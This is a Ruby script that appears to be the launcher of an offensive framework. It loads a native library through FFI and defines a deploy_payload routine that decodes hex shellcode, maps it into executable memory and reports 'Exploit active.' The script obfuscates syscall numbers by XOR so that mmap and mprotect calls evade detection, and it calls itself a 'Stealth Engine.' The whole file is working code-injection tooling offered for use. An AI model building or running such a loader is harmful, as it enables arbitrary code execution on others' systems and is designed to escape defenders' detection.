#!/usr/bin/env ruby
require 'terminal-table'
require 'ffi'

\
require_relative '../vfsconsole.rb' 

module VFS_UI
  C = { r: "\e[31m", g: "\e[32m", y: "\e[33m", b: "\e[34m", c: "\e[36m", x: "\e[0m", bold: "\e[1m" }
  def self.status(m); puts "#{C[:b]}[*] #{m}#{C[:x]}"; end
  def self.success(m); puts "#{C[:g]}[+] #{m}#{C[:x]}"; end
  def self.error(m); puts "#{C[:r]}[-] ERROR: #{m}#{C[:x]}"; end
end

module VFS_Engine
  extend FFI::Library
  CORE_PATH = File.expand_path('../lib/vfs_core.so', __dir__)
  
  begin
    ffi_lib CORE_PATH
    attach_function :vfs_raw_gate, [:long, :long, :long, :long, :long, :long], :long
    @ready = true
  rescue LoadError => e
    VFS_UI.error("Core not found at #{CORE_PATH}")
    @ready = false
  end

  def self.ready?; @ready; end

  def self.gate(n, a1=0, a2=0, a3=0, a4=0, a5=0)
    return 0 unless @ready
    vfs_raw_gate(n, a1, a2, a3, a4, a5)
  end
end

class VFS_Memory
  def self.deploy_payload(hex_payload)
    return VFS_UI.error("Stealth Engine Offline") unless VFS_Engine.ready?
    
    raw_bin = [hex_payload].pack("H*")
    len = raw_bin.length
    
    # n=163 ^ 0xAA = 9 (mmap)
    addr = VFS_Engine.gate(163, 0, len, 7, 34, -1) 
    
    VFS_UI.status("Segment mapped at: 0x#{addr.to_s(16)}")
    
    FFI::Pointer.new(addr).put_bytes(0, raw_bin)
    
    VFS_Engine.gate(160, addr, len, 5, 0, 0)
    
    VFS_UI.success("Memory flipped to Read/Execute. Exploit active.")
  end
end

begin
  mod_base = File.expand_path("../modules", __dir__)
  framework = VFSFramework.new(mod_base)
  framework.start 
rescue Interrupt
  puts "\n\n#{VFS_UI::C[:y]}[!] Exit signal received.#{VFS_UI::C[:x]}"
  exit(0)
end